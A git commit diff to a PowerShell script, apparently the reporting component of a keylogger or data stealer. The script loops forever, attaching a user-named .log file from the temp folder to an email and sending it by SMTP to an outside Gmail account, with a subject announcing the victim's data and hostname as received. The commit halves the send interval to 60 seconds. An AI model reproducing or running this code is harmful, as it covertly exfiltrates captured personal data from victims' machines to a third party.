a7eb1f7133dfaefb17abdf8b611f33d92ac74007
gabrielg13rojas <gabrielg13rojas@gmail.com>
2023-05-05 10:00:02 -0400

    Update ml.ps1

--- ml.ps1
+++ ml.ps1
@@ -6,4 +6,4 @@ $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = '01100111.m3rc3h4ck@gmail.com'
 $ReportEmail.To.Add('gabrielg13rojas@gmail.com')
 $ReportEmail.Subject = 'DATOS DE ' +$env:UserName+' EN PC: '+ [System.Net.Dns]::GetHostByName(($env:computerName)).HostName + ' RECIBIDOS'
-while(1){$ReportEmail.Attachments.Add("$env:temp/$env:UserName.log");$SMTPInfo.Send($ReportEmail);sleep 120} 
+while(1){$ReportEmail.Attachments.Add("$env:temp/$env:UserName.log");$SMTPInfo.Send($ReportEmail);sleep 60} 
